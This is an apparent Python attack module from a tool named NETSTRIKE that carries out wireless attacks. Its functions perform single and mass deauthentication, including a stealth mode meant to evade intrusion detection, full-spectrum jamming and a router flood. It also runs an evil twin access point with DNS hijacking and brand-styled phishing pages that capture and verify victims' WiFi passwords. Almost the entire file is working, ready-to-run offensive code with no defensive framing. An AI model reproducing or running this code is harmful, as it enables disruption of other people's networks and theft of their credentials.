#!/usr/bin/env python3
"""
NETSTRIKE v4.0 - PHANTOM EDITION
Attack Module — Deauth, Mass Deauth with Skip, Evil Twin, Router Stress, Beacon Flood
"""

import os
import csv
import time
import random
import threading
import http.server
import socketserver
from urllib.parse import unquote


class AttackManager:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.attack_processes = []
        self.attack_running = False
        self.evil_twin_running = False
        self.phishing_server = None
        self.router_brand = "Generic"

        self.oui_database = {
            "C0:25:E9": "TP-Link",  "D8:0D:17": "TP-Link",
            "50:C7:BF": "TP-Link",  "EC:08:6B": "TP-Link",
            "A0:04:60": "Netgear",  "2C:B0:5D": "Netgear",
            "9C:3D:CF": "Netgear",  "F8:8F:CA": "Google",
            "B0:4E:26": "Linksys",  "00:18:F8": "Linksys",
            "00:1B:2F": "ASUS",     "00:1D:60": "ASUS",
            "AC:84:C6": "ASUS",     "50:46:5D": "ASUS",
            "00:24:B2": "Belkin",   "94:44:52": "Belkin",
            "00:1A:2B": "D-Link",   "00:1C:F0": "D-Link",
            "B0:C5:54": "D-Link",   "1C:7E:E5": "D-Link",
            "00:26:5A": "Cisco",    "00:1E:BD": "Cisco",
            "00:1E:7E": "Huawei",   "48:46:FB": "Huawei",
            "18:A6:F7": "Tenda",    "C8:3A:35": "Tenda",
            "00:1A:11": "Zyxel",    "00:14:D1": "Zyxel",
        }

    def _brand(self, bssid):
        return self.oui_database.get(bssid.upper()[:8], "Generic")

    def _safe_channel(self, target):
        try:
            return int(target['channel'])
        except (ValueError, KeyError):
            return 6

    def _set_interface_ip(self, iface, ip="192.168.1.1", mask="255.255.255.0"):
        """Set IP on interface — tries ip(iproute2) then falls back to ifconfig."""
        cidr = "24"
        self.core.run_command(f"ip addr flush dev {iface} 2>/dev/null")
        r = self.core.run_command(f"ip addr add {ip}/{cidr} dev {iface} 2>/dev/null")
        if not r or r.returncode != 0:
            self.core.run_command(f"ifconfig {iface} {ip} netmask {mask} up 2>/dev/null")
        self.core.run_command(f"ip link set {iface} up 2>/dev/null")

    # ═══════════════════════════════════════════════
    # 1. SINGLE TARGET DEAUTH
    # ═══════════════════════════════════════════════

    def single_target_attack(self):
        if not self.scanner.wifi_scan():
            return
        self.scanner.display_scan_results()
        target = self.scanner.select_target()
        if not target:
            return

        print("\n\033[1;35m┌─ Attack Mode ───────────────────────────────┐\033[0m")
        print("\033[1;35m│  1) NORMAL   Maximum power, fastest kill      │\033[0m")
        print("\033[1;35m│  2) STEALTH  Low rate, evades basic WIDS      │\033[0m")
        print("\033[1;35m└──────────────────────────────────────────────┘\033[0m")
        stealth = input("\033[1;36m[?] Mode (1/2): \033[0m").strip() == "2"

        self.core.set_current_operation("SINGLE_DEAUTH")
        self.attack_running = True
        self._run_single_deauth(target, stealth)
        self.core.clear_current_operation()

    def _run_single_deauth(self, target, stealth):
        bssid   = target['bssid']
        channel = self._safe_channel(target)
        essid   = target['essid']
        mon     = self.core.mon_interface

        # Lock channel
        self.core.run_command(f"iwconfig {mon} channel {channel} 2>/dev/null")
        time.sleep(0.3)

        if stealth:
            print(f"\033[1;35m[👻] STEALTH DEAUTH: {essid}  (low-rate, variable timing)\033[0m")

            p1 = self.core.run_command(
                f"mdk4 {mon} d -B {bssid} -c {channel} -s 30",
                background=True
            )
            if p1:
                self.attack_processes.append(p1)
                self.core.add_attack_process(p1)

            threading.Thread(
                target=self._stealth_burst_loop, args=(bssid, mon), daemon=True
            ).start()

        else:
            print(f"\033[1;31m[💥] PHANTOM ENGINE: Full-power deauth → {essid}\033[0m")

            # Engine 1: aireplay broadcast
            p1 = self.core.run_command(
                f"aireplay-ng --deauth 0 -a {bssid} {mon}",
                background=True
            )
            # Engine 2: MDK4 fills gaps
            p2 = self.core.run_command(
                f"mdk4 {mon} d -B {bssid} -c {channel}",
                background=True
            )
            for p in [p1, p2]:
                if p:
                    self.attack_processes.append(p)
                    self.core.add_attack_process(p)

            # Engine 3: per-client targeted
            threading.Thread(
                target=self._discover_and_deauth_clients,
                args=(target,), daemon=True
            ).start()

        threading.Thread(
            target=self._anim_single, args=(essid, stealth), daemon=True
        ).start()

        print("\033[1;33m[⏹] Press Enter to stop...\033[0m")
        input()
        self.stop_attacks()
        print("\033[1;32m[✓] Attack terminated\033[0m")

    def _stealth_burst_loop(self, bssid, mon):
        """Random-interval aireplay bursts — low WIDS fingerprint"""
        while self.attack_running:
            count = random.randint(2, 5)
            self.core.run_command(
                f"aireplay-ng --deauth {count} -a {bssid} {mon} > /dev/null 2>&1"
            )
            time.sleep(random.uniform(1.5, 4.5))

    def _discover_and_deauth_clients(self, target):
        """Capture brief CSV, parse associated clients, launch per-client deauth"""
        bssid   = target['bssid']
        channel = self._safe_channel(target)
        mon     = self.core.mon_interface
        tmp     = f"/tmp/ns_cl_{bssid.replace(':', '')}"

        proc = self.core.run_command(
            f"airodump-ng --bssid {bssid} -c {channel} "
            f"-w {tmp} --output-format csv {mon}",
            background=True
        )
        time.sleep(8)
        if proc:
            try:
                proc.terminate()
            except Exception:
                pass

        clients = self._parse_clients_from_csv(f"{tmp}-01.csv", bssid)
        if not clients:
            return

        print(f"\033[1;31m\n[🎯] Engine 3: targeting {len(clients)} clients\033[0m")
        for mac in clients:
            if not self.attack_running:
                break
            p = self.core.run_command(
                f"aireplay-ng --deauth 0 -a {bssid} -c {mac} {mon}",
                background=True
            )
            if p:
                self.attack_processes.append(p)
                self.core.add_attack_process(p)

    def _parse_clients_from_csv(self, csv_file, target_bssid):
        clients = []
        if not os.path.exists(csv_file):
            return clients
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='replace') as f:
                content = f.readlines()
            in_clients = False
            for line in content:
                if "Station MAC" in line:
                    in_clients = True
                    continue
                if not in_clients or not line.strip():
                    continue
                for row in csv.reader([line]):
                    if len(row) >= 6:
                        mac   = row[0].strip()
                        assoc = row[5].strip()
                        if len(mac) == 17 and mac.count(':') == 5 and assoc == target_bssid:
                            clients.append(mac)
        except Exception:
            pass
        return clients

    # ═══════════════════════════════════════════════
    # 2. MASS DEAUTH WITH SKIP
    # ═══════════════════════════════════════════════

    def mass_deauth_with_skip(self):
        """Scan everything, user picks networks to protect, attack the rest"""
        print("\033[1;31m[🌐] Mass Deauth — PHANTOM PROTOCOL\033[0m")

        if not self.scanner.wifi_scan(20):
            return
        if not self.scanner.networks:
            print("\033[1;31m[✘] No networks found\033[0m")
            return

        self.scanner.display_scan_results()

        sorted_nets = sorted(
            self.scanner.networks.items(),
            key=lambda x: int(x[1]['power']) if x[1]['power'].lstrip('-').isdigit() else 0,
            reverse=True
        )

        total = len(sorted_nets)
        print(f"\n\033[1;33m[!] {total} networks found\033[0m")
        print("\033[1;36m[?] Enter numbers to SKIP (comma-separated, e.g. 1,3,5) or Enter to attack ALL:\033[0m")
        raw = input("\033[1;36m[?] Skip: \033[0m").strip()

        skip_bssids = set()
        if raw:
            try:
                for part in raw.split(','):
                    idx = int(part.strip()) - 1
                    if 0 <= idx < total:
                        net = sorted_nets[idx][1]
                        skip_bssids.add(net['bssid'])
                        print(f"\033[1;32m[✓] Skipping: {net['essid']} ({net['bssid']})\033[0m")
            except ValueError:
                print("\033[1;33m[!] Invalid input — attacking all\033[0m")

        attack_count = total - len(skip_bssids)
        print(f"\033[1;31m[🎯] Will attack {attack_count} network(s)\033[0m")

        confirm = input("\033[1;31m[?] Confirm? (y/N): \033[0m").strip().lower()
        if confirm not in ['y', 'yes']:
            print("\033[1;33m[✘] Cancelled\033[0m")
            return

        print("\n\033[1;35m┌─ Attack Mode ───────────────────────────────┐\033[0m")
        print("\033[1;35m│  1) NORMAL   Max power                        │\033[0m")
        print("\033[1;35m│  2) STEALTH  Low rate, variable timing        │\033[0m")
        print("\033[1;35m└──────────────────────────────────────────────┘\033[0m")
        stealth = input("\033[1;36m[?] Mode (1/2): \033[0m").strip() == "2"

        self.core.set_current_operation("MASS_DEAUTH")
        self.attack_running = True
        self._run_mass_deauth(skip_bssids, stealth, sorted_nets)
        self.core.clear_current_operation()

    def _run_mass_deauth(self, skip_bssids, stealth, sorted_nets):
        mon = self.core.mon_interface

        target_nets = [net for _, net in sorted_nets if net['bssid'] not in skip_bssids]
        if not target_nets:
            print("\033[1;31m[✘] No targets after skip\033[0m")
            return

        # MDK4 blacklist
        bl_file = "/tmp/ns_bl.txt"
        with open(bl_file, 'w') as f:
            for bssid in skip_bssids:
                f.write(bssid + '\n')

        channels = set()
        for net in target_nets:
            try:
                channels.add(int(net['channel']))
            except ValueError:
                pass
        ch_str = ','.join(str(c) for c in sorted(channels))

        speed = 30 if stealth else 1000
        label = "STEALTH MASS" if stealth else "PHANTOM MASS"
        print(f"\033[1;31m[💥] {label} DEAUTH: {len(target_nets)} targets  |  ch: {ch_str}\033[0m")

        # ENGINE 1: MDK4 global deauth
        mdk4_cmd = f"mdk4 {mon} d"
        if skip_bssids:
            mdk4_cmd += f" -b {bl_file}"
        if ch_str:
            mdk4_cmd += f" -c {ch_str}"
        if stealth:
            mdk4_cmd += f" -s {speed}"

        p = self.core.run_command(f"{mdk4_cmd}", background=True)
        if p:
            self.attack_processes.append(p)
            self.core.add_attack_process(p)

        if not stealth:
            # ENGINE 2: second MDK4 instance for redundancy (no channel filter = all channels)
            p2 = self.core.run_command(
                f"mdk4 {mon} d" + (f" -b {bl_file}" if skip_bssids else ""),
                background=True
            )
            if p2:
                self.attack_processes.append(p2)
                self.core.add_attack_process(p2)

        # ENGINE 3: per-target aireplay threads — ALL targets, no cap
        for net in target_nets:
            threading.Thread(
                target=self._continuous_deauth_thread,
                args=(net, stealth), daemon=True
            ).start()

        threading.Thread(
            target=self._anim_mass, args=(len(target_nets), stealth), daemon=True
        ).start()

        print("\033[1;33m[⏹] Press Enter to stop mass deauth...\033[0m")
        input()
        self.stop_attacks()
        print("\033[1;32m[✓] Mass deauth terminated\033[0m")

    def _continuous_deauth_thread(self, net, stealth):
        bssid = net['bssid']
        mon   = self.core.mon_interface
        count = "3" if stealth else "0"
        while self.attack_running:
            self.core.run_command(
                f"aireplay-ng --deauth {count} -a {bssid} {mon} > /dev/null 2>&1"
            )
            if stealth:
                time.sleep(random.uniform(2.0, 5.0))
            else:
                time.sleep(0.1)

    # ═══════════════════════════════════════════════
    # 3. FULL SPECTRUM JAMMING
    # ═══════════════════════════════════════════════

    def mass_destruction(self):
        if not self.scanner.wifi_scan():
            return

        count = len(self.scanner.networks)
        if count == 0:
            print("\033[1;31m[✘] No networks found\033[0m")
            return

        print(f"\033[1;33m[🎯] {count} networks in range\033[0m")
        confirm = input("\033[1;31m[?] Launch full-spectrum jamming? (y/N): \033[0m").strip().lower()
        if confirm not in ['y', 'yes']:
            print("\033[1;33m[✘] Cancelled\033[0m")
            return

        channels = set()
        for net in self.scanner.networks.values():
            try:
                channels.add(int(net['channel']))
            except ValueError:
                pass
        ch_str = ','.join(str(c) for c in sorted(channels))

        self.core.set_current_operation("FULL_JAMMING")
        self.attack_running = True
        mon = self.core.mon_interface

        print(f"\033[1;31m[💥] Full-spectrum jamming: ch {ch_str} — {count} targets\033[0m")

        # ENGINE 1: MDK4 deauth with channel list
        p1 = self.core.run_command(f"mdk4 {mon} d -c {ch_str}", background=True)
        if p1:
            self.attack_processes.append(p1)
            self.core.add_attack_process(p1)

        # ENGINE 2: MDK4 second instance — no filter, blanket all
        p2 = self.core.run_command(f"mdk4 {mon} d", background=True)
        if p2:
            self.attack_processes.append(p2)
            self.core.add_attack_process(p2)

        # ENGINE 3: per-target aireplay continuous deauth on every found network
        for net in self.scanner.networks.values():
            threading.Thread(
                target=self._continuous_deauth_thread,
                args=(net, False), daemon=True
            ).start()

        threading.Thread(
            target=self._anim_mass, args=(count, False), daemon=True
        ).start()

        print("\033[1;33m[⏹] Press Enter to stop...\033[0m")
        input()
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✓] Jamming terminated\033[0m")

    # ═══════════════════════════════════════════════
    # 4. ROUTER STRESS TEST
    # ═══════════════════════════════════════════════

    def router_destroyer(self):
        if input("\033[1;31m[?] Type 'STRESS' to confirm: \033[0m").strip().lower() != 'stress':
            print("\033[1;33m[✘] Cancelled\033[0m")
            return
        if input("\033[1;31m[?] Type 'CONFIRM' to proceed: \033[0m").strip().lower() != 'confirm':
            print("\033[1;33m[✘] Cancelled\033[0m")
            return

        if not self.scanner.wifi_scan():
            return
        self.scanner.display_scan_results()
        target = self.scanner.select_target()
        if not target:
            return

        bssid   = target['bssid']
        channel = self._safe_channel(target)
        essid   = target['essid']
        mon     = self.core.mon_interface

        self.core.set_current_operation("ROUTER_STRESS")
        self.attack_running = True

        self.core.run_command(f"iwconfig {mon} channel {channel} 2>/dev/null")

        vectors = [
            (f"mdk4 {mon} a -a {bssid} -m",                           "Auth Flood"),
            (f"mdk4 {mon} x -t {bssid} -n {essid}",                   "EAPOL Flood"),
            (f"mdk4 {mon} b -c {channel} -s 1000",                    "Beacon Flood"),
            (f"aireplay-ng --deauth 0 -a {bssid} {mon}",              "Deauth Storm"),
            (f"mdk4 {mon} d -B {bssid} -c {channel}",                 "MDK4 Deauth"),
            (f"aireplay-ng --fakeauth 0 -a {bssid} {mon}",            "Fake Auth"),
        ]

        for cmd, name in vectors:
            p = self.core.run_command(cmd, background=True)
            if p:
                self.attack_processes.append(p)
                self.core.add_attack_process(p)
            print(f"\033[1;31m[🔧] {name}: ACTIVE\033[0m")

        threading.Thread(target=self._anim_stress, daemon=True).start()
        print("\033[1;33m[⏹] Press Enter to stop...\033[0m")
        input()
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✓] Stress test terminated\033[0m")

    # ═══════════════════════════════════════════════
    # 5. EVIL TWIN — CHAMELEON ENGINE
    # ═══════════════════════════════════════════════

    def advanced_evil_twin(self):
        if not self.scanner.wifi_scan():
            return
        self.scanner.display_scan_results()
        target = self.scanner.select_target()
        if not target:
            return

        self.router_brand = self._brand(target['bssid'])
        print(f"\033[1;34m[🎭] CHAMELEON: {self.router_brand} theme detected\033[0m")

        hs_file = None
        cap = input("\033[1;36m[?] Capture handshake for password verification? (y/N): \033[0m").strip().lower()
        if cap in ['y', 'yes']:
            hs_file = self._capture_handshake(target)
            if not hs_file:
                print("\033[1;33m[!] No handshake — proceeding without verification\033[0m")

        self._start_evil_twin(target, hs_file)

    def _capture_handshake(self, target):
        out   = f"/tmp/ns_twin_{target['bssid'].replace(':', '')}"
        cap_p = self.core.run_command(
            f"airodump-ng -c {target['channel']} --bssid {target['bssid']} "
            f"-w {out} {self.core.mon_interface}",
            background=True
        )
        deauth_p = self.core.run_command(
            f"aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface}",
            background=True
        )
        print("\033[1;36m[⏱] Capturing handshake (30 s)...\033[0m")
        time.sleep(30)
        for p in [cap_p, deauth_p]:
            if p:
                try:
                    p.terminate()
                except Exception:
                    pass

        cap_file = f"{out}-01.cap"
        if os.path.exists(cap_file):
            r = self.core.run_command(
                f"aircrack-ng {cap_file} 2>/dev/null | grep -i '{target['bssid']}'"
            )
            if r and "1 handshake" in r.stdout:
                print("\033[1;32m[✓] Handshake captured\033[0m")
                return cap_file
        print("\033[1;31m[✘] No handshake\033[0m")
        return None

    def _start_evil_twin(self, target, hs_file):
        try:
            self.core.set_current_operation("EVIL_TWIN")
            self.evil_twin_running = True
            mon     = self.core.mon_interface
            channel = self._safe_channel(target)

            self.core.run_command("systemctl stop NetworkManager 2>/dev/null")
            time.sleep(2)

            # hw_mode: 'a' for 5GHz (ch > 14), 'g' for 2.4GHz
            hw_mode = "a" if channel > 14 else "g"

            with open("/tmp/ns_hostapd.conf", "w") as f:
                f.write(
                    f"interface={mon}\n"
                    f"driver=nl80211\n"
                    f"ssid={target['essid']}\n"
                    f"channel={channel}\n"
                    f"hw_mode={hw_mode}\n"
                    f"auth_algs=1\n"
                    f"ignore_broadcast_ssid=0\n"
                    f"wpa=0\n"
                )

            with open("/tmp/ns_dnsmasq.conf", "w") as f:
                f.write(
                    f"interface={mon}\n"
                    f"dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h\n"
                    f"dhcp-option=3,192.168.1.1\n"
                    f"dhcp-option=6,192.168.1.1\n"
                    # Apple
                    f"address=/captive.apple.com/192.168.1.1\n"
                    f"address=/www.apple.com/192.168.1.1\n"
                    f"address=/apple.com/192.168.1.1\n"
                    # Android / Google
                    f"address=/connectivitycheck.gstatic.com/192.168.1.1\n"
                    f"address=/connectivitycheck.android.com/192.168.1.1\n"
                    f"address=/clients3.google.com/192.168.1.1\n"
                    f"address=/generate_204.google.com/192.168.1.1\n"
                    # Windows
                    f"address=/www.msftncsi.com/192.168.1.1\n"
                    f"address=/ipv6.msftncsi.com/192.168.1.1\n"
                    f"address=/detectportal.firefox.com/192.168.1.1\n"
                    # Catch-all
                    f"address=/#/192.168.1.1\n"
                )

            # Network setup (works with both iproute2 and ifconfig)
            self._set_interface_ip(mon)
            self.core.run_command("echo 1 > /proc/sys/net/ipv4/ip_forward")
            self.core.run_command("iptables --flush 2>/dev/null")
            self.core.run_command("iptables -t nat --flush 2>/dev/null")
            self.core.run_command("iptables -t nat -A PREROUTING -p tcp --dport 80  -j REDIRECT --to-port 80")
            self.core.run_command("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 80")

            for cmd, name in [
                ("dnsmasq -C /tmp/ns_dnsmasq.conf 2>/dev/null", "dnsmasq"),
                ("hostapd /tmp/ns_hostapd.conf 2>/dev/null",    "hostapd"),
            ]:
                p = self.core.run_command(cmd, background=True)
                if p:
                    self.attack_processes.append(p)
                    self.core.add_attack_process(p)
                print(f"\033[1;32m[✓] {name} started\033[0m")

            time.sleep(3)

            threading.Thread(
                target=self._run_phishing_server,
                args=(target,), daemon=True
            ).start()
            threading.Thread(
                target=self._monitor_captured_passwords,
                args=(target, hs_file), daemon=True
            ).start()
            threading.Thread(
                target=self._deauth_real_ap_loop,
                args=(target,), daemon=True
            ).start()

            print(f"\033[1;32m[✓] Evil Twin live: \"{target['essid']}\" ({self.router_brand} theme)\033[0m")
            print("\033[1;33m[👀] Waiting for victims... Press Enter to stop.\033[0m")
            input()

        except Exception as e:
            print(f"\033[1;31m[✘] Evil Twin error: {e}\033[0m")
        finally:
            self._stop_evil_twin()
            self.core.clear_current_operation()

    def _deauth_real_ap_loop(self, target):
        """Keep real AP clients disconnected — dual engine: aireplay + MDK4."""
        bssid   = target['bssid']
        channel = self._safe_channel(target)
        mon     = self.core.mon_interface

        # Launch MDK4 continuous deauth in background
        mdk4_p = self.core.run_command(
            f"mdk4 {mon} d -B {bssid} -c {channel}",
            background=True
        )
        if mdk4_p:
            self.attack_processes.append(mdk4_p)
            self.core.add_attack_process(mdk4_p)

        # Aireplay loop — continuous broadcast deauth
        while self.evil_twin_running:
            self.core.run_command(
                f"aireplay-ng --deauth 0 -a {bssid} {mon} > /dev/null 2>&1 &"
            )
            time.sleep(3)

    def _run_phishing_server(self, target):
        brand = self.router_brand
        essid = target['essid']

        PAGES = {
            "TP-Link": (
                "<html><head><title>TP-Link</title><style>"
                "body{font-family:Arial,sans-serif;background:#f5f5f5;margin:0}"
                ".w{max-width:400px;margin:60px auto;background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.15);overflow:hidden}"
                ".h{background:#4A90E2;color:#fff;padding:18px 24px}.h h2{margin:0}"
                ".b{padding:24px}"
                "input[type=password]{width:100%;padding:10px;border:1px solid #ccc;border-radius:3px;box-sizing:border-box;margin:8px 0 16px}"
                "button{background:#4A90E2;color:#fff;border:none;padding:10px 22px;border-radius:3px;cursor:pointer}"
                "</style></head><body>"
                f"<div class=w><div class=h><h2>TP-Link Wireless Router</h2></div>"
                f"<div class=b><p>Connect to <b>{essid}</b></p>"
                "<form method=POST action=/>"
                "<input type=password name=password placeholder='WiFi Password' required>"
                "<button type=submit>Connect</button></form></div></div></body></html>"
            ),
            "Netgear": (
                "<html><head><title>NETGEAR</title><style>"
                "body{font-family:Arial,sans-serif;background:#1a1a1a;color:#fff;margin:0}"
                ".w{max-width:400px;margin:60px auto;background:#2c2c2c;border-radius:4px;overflow:hidden}"
                ".h{background:#6DBE47;padding:18px 24px}.h h2{margin:0}"
                ".b{padding:24px}"
                "input[type=password]{width:100%;padding:10px;background:#1a1a1a;border:1px solid #555;color:#fff;border-radius:3px;box-sizing:border-box;margin:8px 0 16px}"
                "button{background:#6DBE47;color:#fff;border:none;padding:10px 22px;border-radius:3px;cursor:pointer}"
                "</style></head><body>"
                f"<div class=w><div class=h><h2>NETGEAR</h2></div>"
                f"<div class=b><p>Network: <b>{essid}</b></p>"
                "<form method=POST action=/>"
                "<input type=password name=password placeholder='Network Security Key' required>"
                "<button type=submit>Apply</button></form></div></div></body></html>"
            ),
            "ASUS": (
                "<html><head><title>ASUS Router</title><style>"
                "body{font-family:Arial,sans-serif;background:#000;color:#fff;margin:0}"
                ".w{max-width:400px;margin:60px auto;background:#111;border-radius:4px;overflow:hidden}"
                ".h{background:#00A8E0;padding:18px 24px}.h h2{margin:0}"
                ".b{padding:24px}"
                "input[type=password]{width:100%;padding:10px;background:#222;border:1px solid #444;color:#fff;border-radius:3px;box-sizing:border-box;margin:8px 0 16px}"
                "button{background:#00A8E0;color:#fff;border:none;padding:10px 22px;border-radius:3px;cursor:pointer}"
                "</style></head><body>"
                f"<div class=w><div class=h><h2>ASUS Router</h2></div>"
                f"<div class=b><p>Connect to <b>{essid}</b></p>"
                "<form method=POST action=/>"
                "<input type=password name=password placeholder='WiFi Password' required>"
                "<button type=submit>Login</button></form></div></div></body></html>"
            ),
            "D-Link": (
                "<html><head><title>D-Link</title><style>"
                "body{font-family:Arial,sans-serif;background:#f0f0f0;margin:0}"
                ".w{max-width:420px;margin:60px auto;background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.2);overflow:hidden}"
                ".h{background:#0057A8;color:#fff;padding:18px 24px}.h h2{margin:0}"
                ".b{padding:24px}"
                "input[type=password]{width:100%;padding:10px;border:1px solid #bbb;border-radius:3px;box-sizing:border-box;margin:8px 0 16px}"
                "button{background:#0057A8;color:#fff;border:none;padding:10px 22px;border-radius:3px;cursor:pointer}"
                "</style></head><body>"
                f"<div class=w><div class=h><h2>D-Link Wireless Router</h2></div>"
                f"<div class=b><p>Please enter the WiFi password for <b>{essid}</b></p>"
                "<form method=POST action=/>"
                "<input type=password name=password placeholder='WiFi Password' required>"
                "<button type=submit>Connect</button></form></div></div></body></html>"
            ),
            "Linksys": (
                "<html><head><title>Linksys Smart Wi-Fi</title><style>"
                "body{font-family:Arial,sans-serif;background:#003366;margin:0}"
                ".w{max-width:400px;margin:60px auto;background:#fff;border-radius:6px;overflow:hidden}"
                ".h{background:#FF6600;color:#fff;padding:18px 24px}.h h2{margin:0}"
                ".b{padding:24px}"
                "input[type=password]{width:100%;padding:10px;border:1px solid #ccc;border-radius:3px;box-sizing:border-box;margin:8px 0 16px}"
                "button{background:#FF6600;color:#fff;border:none;padding:10px 22px;border-radius:3px;cursor:pointer}"
                "</style></head><body>"
                f"<div class=w><div class=h><h2>Linksys Smart Wi-Fi</h2></div>"
                f"<div class=b><p>Join network <b>{essid}</b></p>"
                "<form method=POST action=/>"
                "<input type=password name=password placeholder='Network Password' required>"
                "<button type=submit>Join</button></form></div></div></body></html>"
            ),
            "Huawei": (
                "<html><head><title>Huawei Router</title><style>"
                "body{font-family:Arial,sans-serif;background:#f5f5f5;margin:0}"
                ".w{max-width:400px;margin:60px auto;background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.15);overflow:hidden}"
                ".h{background:#CF0A2C;color:#fff;padding:18px 24px}.h h2{margin:0}"
                ".b{padding:24px}"
                "input[type=password]{width:100%;padding:10px;border:1px solid #ccc;border-radius:3px;box-sizing:border-box;margin:8px 0 16px}"
                "button{background:#CF0A2C;color:#fff;border:none;padding:10px 22px;border-radius:3px;cursor:pointer}"
                "</style></head><body>"
                f"<div class=w><div class=h><h2>Huawei Router</h2></div>"
                f"<div class=b><p>Connect to <b>{essid}</b></p>"
                "<form method=POST action=/>"
                "<input type=password name=password placeholder='WiFi Password' required>"
                "<button type=submit>Connect</button></form></div></div></body></html>"
            ),
            "Tenda": (
                "<html><head><title>Tenda</title><style>"
                "body{font-family:Arial,sans-serif;background:#fff;margin:0}"
                ".w{max-width:400px;margin:60px auto;background:#fff;border:1px solid #ddd;border-radius:4px;overflow:hidden}"
                ".h{background:#1890FF;color:#fff;padding:18px 24px}.h h2{margin:0}"
                ".b{padding:24px}"
                "input[type=password]{width:100%;padding:10px;border:1px solid #d9d9d9;border-radius:3px;box-sizing:border-box;margin:8px 0 16px}"
                "button{background:#1890FF;color:#fff;border:none;padding:10px 22px;border-radius:3px;cursor:pointer}"
                "</style></head><body>"
                f"<div class=w><div class=h><h2>Tenda WiFi</h2></div>"
                f"<div class=b><p>Connect to <b>{essid}</b></p>"
                "<form method=POST action=/>"
                "<input type=password name=password placeholder='WiFi Key' required>"
                "<button type=submit>Connect</button></form></div></div></body></html>"
            ),
            "Cisco": (
                "<html><head><title>Cisco</title><style>"
                "body{font-family:Arial,sans-serif;background:#049fd9;margin:0}"
                ".w{max-width:400px;margin:60px auto;background:#fff;border-radius:4px;overflow:hidden}"
                ".h{background:#049fd9;color:#fff;padding:18px 24px}.h h2{margin:0}"
                ".b{padding:24px}"
                "input[type=password]{width:100%;padding:10px;border:1px solid #ccc;border-radius:3px;box-sizing:border-box;margin:8px 0 16px}"
                "button{background:#049fd9;color:#fff;border:none;padding:10px 22px;border-radius:3px;cursor:pointer}"
                "</style></head><body>"
                f"<div class=w><div class=h><h2>Cisco Systems</h2></div>"
                f"<div class=b><p>Authenticate to <b>{essid}</b></p>"
                "<form method=POST action=/>"
                "<input type=password name=password placeholder='Network Key' required>"
                "<button type=submit>Authenticate</button></form></div></div></body></html>"
            ),
        }

        GENERIC = (
            "<html><head><title>Network Login</title><style>"
            "body{font-family:Arial,sans-serif;background:#eee;margin:0}"
            ".w{max-width:380px;margin:80px auto;background:#fff;padding:30px;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,.2)}"
            "input[type=password]{width:100%;padding:10px;border:1px solid #ccc;margin:10px 0 20px;border-radius:3px;box-sizing:border-box}"
            "button{background:#333;color:#fff;border:none;padding:10px 20px;border-radius:3px;cursor:pointer}"
            "</style></head><body>"
            f"<div class=w><h2>Network Login</h2>"
            f"<p>Enter WiFi password for <b>{essid}</b>:</p>"
            "<form method=POST action=/>"
            "<input type=password name=password placeholder='WiFi Password' required>"
            "<button type=submit>Connect</button></form></div></body></html>"
        )

        page_html = PAGES.get(brand, GENERIC)

        connecting_page = (
            "<html><head><title>Connecting...</title>"
            "<meta http-equiv='refresh' content='8;url=/'>"
            "<style>"
            "body{background:#f5f5f5;font-family:Arial,sans-serif;text-align:center;padding:80px;margin:0}"
            ".spinner{display:inline-block;width:48px;height:48px;border:5px solid #ccc;"
            "border-top-color:#4A90E2;border-radius:50%;animation:spin 1s linear infinite}"
            "@keyframes spin{to{transform:rotate(360deg)}}"
            "h2{color:#333;margin-bottom:10px}p{color:#777}"
            "</style></head><body>"
            f"<h2>Connecting to {essid}...</h2>"
            "<div class='spinner'></div>"
            "<p style='margin-top:20px'>Verifying credentials, please wait...</p>"
            "</body></html>"
        )

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                pass

            def do_GET(self):
                if self.path == '/favicon.ico':
                    self.send_response(404)
                    self.end_headers()
                    return
                if self.path.startswith('/connecting'):
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html; charset=utf-8")
                    self.end_headers()
                    self.wfile.write(connecting_page.encode("utf-8"))
                    return
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(page_html.encode("utf-8"))

            def do_POST(self):
                try:
                    length = int(self.headers.get("Content-Length", 0))
                    data = self.rfile.read(length).decode("utf-8", errors="replace")
                    if "password=" in data:
                        raw = data.split("password=")[1].split("&")[0]
                        pw = unquote(raw)
                        with open("/tmp/ns_captured_pw.txt", "a") as f:
                            f.write(pw + "\n")
                        print(f"\033[1;32m\n[🔑] PASSWORD CAPTURED: {pw}\033[0m")
                except Exception:
                    pass
                # Redirect to "connecting" page so victim doesn't immediately try again
                self.send_response(302)
                self.send_header("Location", "/connecting")
                self.end_headers()

            # Catch-all routes for captive portal probes
            do_HEAD = do_GET

        try:
            socketserver.TCPServer.allow_reuse_address = True
            self.phishing_server = socketserver.TCPServer(("", 80), Handler)
            self.phishing_server.serve_forever()
        except Exception as e:
            print(f"\033[1;31m[✘] Web server error: {e}\033[0m")

    def _monitor_captured_passwords(self, target, hs_file):
        pw_file = "/tmp/ns_captured_pw.txt"
        seen    = set()
        while self.evil_twin_running:
            if os.path.exists(pw_file):
                try:
                    with open(pw_file) as f:
                        lines = [l.strip() for l in f if l.strip()]
                    for pw in lines:
                        if pw in seen:
                            continue
                        seen.add(pw)
                        if hs_file and os.path.exists(hs_file):
                            r = self.core.run_command(
                                f"echo '{pw}' | aircrack-ng -w - -b {target['bssid']} {hs_file} 2>/dev/null"
                            )
                            if r and "KEY FOUND" in r.stdout:
                                print(f"\033[1;32m[🎉] VERIFIED PASSWORD: {pw}\033[0m")
                                self._save_creds(target, pw)
                            else:
                                print(f"\033[1;31m[✘] Wrong attempt: {pw}\033[0m")
                        else:
                            print(f"\033[1;33m[💾] Captured: {pw}\033[0m")
                            self._save_creds(target, pw)
                except Exception:
                    pass
            time.sleep(3)

    def _stop_evil_twin(self):
        self.evil_twin_running = False
        if self.phishing_server:
            try:
                self.phishing_server.shutdown()
            except Exception:
                pass
        self.stop_attacks()
